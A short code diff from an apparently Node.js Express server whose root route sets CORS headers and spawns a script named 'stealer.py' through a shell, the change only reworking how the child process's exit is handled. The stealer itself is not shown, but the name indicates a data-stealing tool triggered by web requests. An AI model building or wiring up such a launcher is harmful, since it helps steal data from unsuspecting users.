@@ -19,9 +19,9 @@ app.get('/', async(req, res) => {
   res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
 
   let dummy = spawn("python ./stealer.py", { shell: true });
-  await new Promise( (resolve) => {
-    dummy.on('close', resolve)
-})
+  dummy.on('close', (code) => {
+    console.log(`child process exited with code ${code}`);
+  });
   dummy.stdout.on('data', function(data) {
     sys.print(data.toString());
   });
